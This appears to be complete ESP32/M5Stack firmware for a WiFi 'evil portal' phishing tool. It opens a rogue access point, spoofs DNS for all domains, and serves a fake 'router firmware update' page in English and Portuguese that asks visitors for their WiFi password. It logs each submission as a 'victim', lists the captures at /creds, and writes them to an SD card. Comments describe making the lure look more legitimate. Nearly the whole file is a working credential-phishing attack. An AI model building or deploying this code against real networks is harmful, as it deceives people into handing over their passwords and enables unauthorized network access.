// Borrowed the code from https://github.com/n0xa/m5stick-nemo. This fork started as a personal understand of the code to try to improve it.
// Borrowed some ideas from https://github.com/wifiphisher/wifiphisher.
// This was always about having fun, and I have a good time every time I debug this!
// Thanks to all contributors!!!

// Borrowed from https://github.com/marivaaldo/evil-portal-m5stack/ which
// has iterative iprovements over my own stand-alone M5Stick Evil Portal.
// Retaining the Portuguese translations since this project has a large
// fan base in Brazil. Shouts to CyberJulio as well.

#define DEFAULT_AP_SSID_NAME "WiFi-Portal"
#define SD_CREDS_PATH "/wifiphisher-creds.txt"

#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR)
#error "Please define only one language: LANGUAGE_EN_US or LANGUAGE_PT_BR"
#endif

#if defined(LANGUAGE_EN_US)
#define LOGIN_TITLE "Firmware Update"
#define LOGIN_SUBTITLE "A new version of the Router firmware has been detected and awaiting installation. For security measures it's necessary to confirm the network and the wifi password."
#define LOGIN_EMAIL_PLACEHOLDER "Confirm the Network SSID"
#define LOGIN_PASSWORD_PLACEHOLDER "Confirm WiFi password"
#define LOGIN_MESSAGE "You need to confirm the WiFi Network and password to start update."
#define LOGIN_BUTTON "Update"
#define LOGIN_AFTER_MESSAGE "Starting to download new security firmware. Do not turn off the Router and/or Modem until the update is complete. If this happens, you'll need to restart the update"
#define TYPE_SSID_TEXT "SSID length should be between 2 and 32\nInvalid: ?,$,\",[,\\,],+\n\nType the SSID\nPress Enter to Confirm\n\n"
#elif defined(LANGUAGE_PT_BR)
#define LOGIN_TITLE "Atualização de Segurança Importante"
#define LOGIN_SUBTITLE "Uma nova atualização de segurança do firmware do Roteador está disponível para download. Por motivos de segurança é necessário confirmar o nome da Rede e a senha WiFi para prosseguir"
#define LOGIN_EMAIL_PLACEHOLDER "Confirme o nome da Rede"
#define LOGIN_PASSWORD_PLACEHOLDER "Confirme a senha WiFi"
#define LOGIN_MESSAGE "É necessário confirmar a Rede e senha WiFi para iniciar a atualização."
#define LOGIN_BUTTON "Atualizar"
#define LOGIN_AFTER_MESSAGE "Iniciando download de novo firmware de segurança... Não desligue o Roteador e/ou o Modem até que a atualização seja concluída. Caso isso aconteca será necessário reiniciar a atualização."
#define TYPE_SSID_TEXT "Tamanho entre 2 e 32\nInvalidos: ?,$,\",[,\\,],+\n\nDigite o SSID\nEnter para Confirmar\n\n"
#endif

// The ideal here is to set the cloned SSID to apear in the text "A new version of the Router firmware SSID_NAME..." not to ask victim to confirm SSID.
// I want to remove the #define LOGIN_EMAIL_PLACEHOLDER "Confirm the Network SSID" too, so it apears more leggit.
// As I don't know by now to solve this, it's a to do thing...

int totalCapturedCredentials = 0;
int previousTotalCapturedCredentials = 0;
String capturedCredentialsHtml = "";

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
IPAddress AP_GATEWAY(172, 0, 0, 1);  // Gateway
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

void setSSID(String ssid){
  #if defined USE_EEPROM
  Serial.printf("Writing %d bytes of SSID to EEPROM\n", ssid.length());
  for(int i = 0; i < ssid.length(); i++) {
    EEPROM.write(i + apSsidOffset, ssid[i]);
    Serial.printf("%d:%d ", i+ apSsidOffset, ssid[i]);
  }
  EEPROM.write(apSsidOffset + ssid.length(), 0);
  EEPROM.commit();
  Serial.println("\ndone.");
  #endif
  apSsidName=ssid;
  return;
}

#ifdef CARDPUTER
void confirmOrTypeSSID(){
  DISP.fillScreen(BLACK);
  DISP.setSwapBytes(true);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(TFT_BLUE, BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println("WiFi SSID");
  DISP.setTextSize(TINY_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.println(TYPE_SSID_TEXT);
  DISP.setTextSize(SMALL_TEXT);
  uint8_t ssidTextCursorY = DISP.getCursorY();
  String currentSSID = String(apSsidName.c_str());
  DISP.printf("%s", currentSSID.c_str());
  bool ssid_ok = false;

  while(!ssid_ok){
    M5Cardputer.update();
    if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) {
      Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
      if(status.del) {
        currentSSID.remove(currentSSID.length() - 1);
      }
      if(status.enter) {
        ssid_ok = true;
      }
      if(currentSSID.length() >= 32) {
        continue;
      }
      for(auto i : status.word) {
        if(i != '?' && i != '$' && i != '\"' && i != '[' && i != '\\' && i != ']' && i != '+'){
          currentSSID += i;
        }
      }
      DISP.fillRect(0, ssidTextCursorY, DISP.width(), DISP.width()- ssidTextCursorY, BLACK);
      DISP.setCursor(0, ssidTextCursorY);
      DISP.printf("%s", currentSSID.c_str());
    }
  }

  if(currentSSID != apSsidName && currentSSID.length() > 2){
    setSSID(currentSSID);
  }
}
#endif

void setupWiFi() {
  Serial.println("Initializing WiFi");
  #if defined(CARDPUTER)
  confirmOrTypeSSID();
  #endif // Cardputer
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(AP_GATEWAY, AP_GATEWAY, IPAddress(255, 255, 255, 0));
  WiFi.softAP(apSsidName);
}

void getSSID(){
  String ssid="";
  #if defined USE_EEPROM
  if(EEPROM.read(apSsidOffset) < 32 || EEPROM.read(apSsidOffset) > 254){
    Serial.println("SSID EEPROM Corrupt or Uninitialized. Using Defaults.");
    apSsidName=DEFAULT_AP_SSID_NAME;
    return;
  }
  for(int i = apSsidOffset; i < apSsidOffset + apSsidMaxLen; i++) {
    int ebyte=EEPROM.read(i);
    Serial.printf("%d:%d ", i, ebyte);
    if(ebyte < 32 || ebyte > 254){
      Serial.println("SSID: " + ssid);
      apSsidName=ssid;
      return;
    }
    ssid += char(ebyte);
  }
  #else
    apSsidName=DEFAULT_AP_SSID_NAME;
  #endif
  return;
}

void printHomeToScreen() {
  DISP.fillScreen(BLACK);
  DISP.setSwapBytes(true);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(TFT_BLUE, BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println("WiFiPhisher");
  DISP.setTextSize(SMALL_TEXT);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  DISP.printf("%s\n\n",apSsidName.c_str());
  DISP.print("WiFi IP: ");
  DISP.println(AP_GATEWAY);
  DISP.println("Paths: /creds /ssid");
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setTextColor(TFT_RED, BGCOLOR);
  DISP.printf("Victims: %d\n", totalCapturedCredentials);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

String getInputValue(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String getHtmlContents(String body) {
  String html =
    "<!DOCTYPE html>"
    "<html>"
    "<head>"
    "  <title>"
    + apSsidName + "</title>"
    "  <meta charset='UTF-8'>"
    "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
    "  <style>a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ padding-top: 25px;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
    "</head>"
    "<body>"
    "  <div class='container'>"
    "    <div class='logo-container'>"
    "      <?xml version='1.0' standalone='no'?>"
    "      <!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 20010904//EN' 'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'>"
    "    </div>"
    "    <div class=form-container>"
    "      <center>"
    "      </center>"
    "      <div style='min-height: 150px'>"
    + body + "      </div>"
    "    </div>"
    "  </div>"
    "</body>"
    "</html>";
  return html;
}

String creds_GET() {
  return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
}

String index_GET() {
  String loginTitle = String(LOGIN_TITLE);
  String loginSubTitle = String(LOGIN_SUBTITLE);
  String loginEmailPlaceholder = String(LOGIN_EMAIL_PLACEHOLDER);
  String loginPasswordPlaceholder = String(LOGIN_PASSWORD_PLACEHOLDER);
  String loginMessage = String(LOGIN_MESSAGE);
  String loginButton = String(LOGIN_BUTTON);

  return getHtmlContents("<center><div class='containertitle'>" + loginTitle + " </div><div class='containersubtitle'>" + loginSubTitle + " </div></center><form action='/post' id='login-form'><input name='email' class='input-field' type='text' placeholder='" + loginEmailPlaceholder + "' required><input name='password' class='input-field' type='password' placeholder='" + loginPasswordPlaceholder + "' required /><div class='containermsg'>" + loginMessage + "</div><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>" + loginButton + " </button></div></form>");
}

String index_POST() {
  String email = getInputValue("email");
  String password = getInputValue("password");
  capturedCredentialsHtml = "<li>SSID: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;

#if defined(SDCARD)
  appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
#endif
  return getHtmlContents(LOGIN_AFTER_MESSAGE);
}

String ssid_GET() {
  return getHtmlContents("<p>Defina uma nova SSID:</p><form action='/postssid' id='login-form'><input name='ssid' class='input-field' type='text' placeholder='"+apSsidName+"' required><button id=submitbtn class=submit-btn type=submit>Mudar SSID</button></div></form>");
}

String ssid_POST() {
  String ssid = getInputValue("ssid");
  Serial.println("A SSID mudou para " + ssid);
  setSSID(ssid);
  printHomeToScreen();
  return getHtmlContents("O Portal vai reiniciar com a nova SSID <b>" + ssid + "</b>. Reconecte à nova rede.");
}

String clear_GET() {
  String email = "<p></p>";
  String password = "<p></p>";
  capturedCredentialsHtml = "<p></p>";
  totalCapturedCredentials = 0;
  return getHtmlContents("<div><p>As credenciais capturadas foram apagadas.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Voltar para o Portal</a></center>");
}

#if defined(M5LED)
void blinkLed() {
  int count = 0;
  while (count < 5) {
    digitalWrite(IRLED, M5LED_ON);
    delay(500);
    digitalWrite(IRLED, M5LED_OFF);
    delay(500);
    count = count + 1;
  }
}
#endif

void shutdownWebServer() {
  Serial.println("Stopping DNS");
  dnsServer.stop();
  Serial.println("Closing Webserver");
  webServer.close();
  Serial.println("Stopping Webserver");
  webServer.stop();
  Serial.println("Setting WiFi to STA mode");
  WiFi.mode(WIFI_MODE_STA);
  Serial.println("Resetting SSID");
  getSSID();
}

void setupWebServer() {
  Serial.println("Starting DNS");
  dnsServer.start(DNS_PORT, "*", AP_GATEWAY);  // DNS spoofing (Only HTTP)
  Serial.println("Setting up Webserver");
  webServer.on("/post", []() {
    totalCapturedCredentials = totalCapturedCredentials + 1;
    webServer.send(HTTP_CODE, "text/html", index_POST());
#if defined(STICK_C_PLUS)
    SPEAKER.tone(4000);
    delay(50);
    SPEAKER.mute();
#elif defined(CARDPUTER)
    SPEAKER.tone(4000, 50);     //Comente essa linha se quiser o WiFiPhisher no modo silencioso
#endif
    DISP.print("Victim Login");
#if defined(M5LED)
    blinkLed();
#endif
  });
  
  Serial.println("Registering /creds");
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds_GET());
  });
  Serial.println("Registering /clear");
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear_GET());
  });
  Serial.println("Registering /ssid");
  webServer.on("/ssid", []() {
    webServer.send(HTTP_CODE, "text/html", ssid_GET());
  });
  Serial.println("Registering /postssid");
  webServer.on("/postssid", []() {
    webServer.send(HTTP_CODE, "text/html", ssid_POST());
    shutdownWebServer();
    isSwitching=true;
    current_proc=19;
  });
  Serial.println("Registering /*");
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index_GET());
  });
  Serial.println("Starting Webserver");
  webServer.begin();
}
